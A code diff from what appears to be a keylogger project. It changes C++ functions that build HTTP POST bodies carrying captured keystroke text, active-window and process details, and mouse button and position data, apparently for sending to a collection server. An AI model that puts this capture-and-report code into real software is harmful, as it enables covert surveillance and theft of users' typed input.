@@ -77,7 +77,7 @@ std::string	HttpPost::createRequest(PaquetKeys *paquet, const std::string &name)
   request += "&paquet_key[active]=";
   request += (paquet->getActive()) ? (paquet->getActive()) : ("");
   request += "&paquet_key[text]=";
-  request += (paquet->getText()) ? (paquet->getText()) : ("");
+  request += (paquet->getTextDecoded()) ? (paquet->getTextDecoded()) : ("");
   request += "&paquet_key[pid]=";
   request += std::to_string(paquet->getPid());
 
@@ -103,7 +103,30 @@ std::string	HttpPost::createRequest(PaquetMouse *paquet, const std::string &name
   request += "&paquet_mouse[y]=";
   request += std::to_string(paquet->getY());
   request += "&paquet_mouse[button]=";
-  request += ((paquet->getButton() == 1) ? ("Left") : ((paquet->getButton() == 2) ? ("Middle") : ("Right")));
+  switch (paquet->getButton())
+    {
+    case (0):
+      request += "None";
+      break;
+    case (1):
+      request += "Left";
+      break;
+    case (2):
+      request += "Middle";
+      break;
+    case (4):
+      request += "Right";
+      break;
+    case (8):
+      request += "X1Button";
+      break;
+    case (16):
+      request += "X2Button";
+      break;
+    default:
+      request += "None";
+      break;
+    }
   request += "&paquet_mouse[pid]=";
   request += std::to_string(paquet->getPid());
 
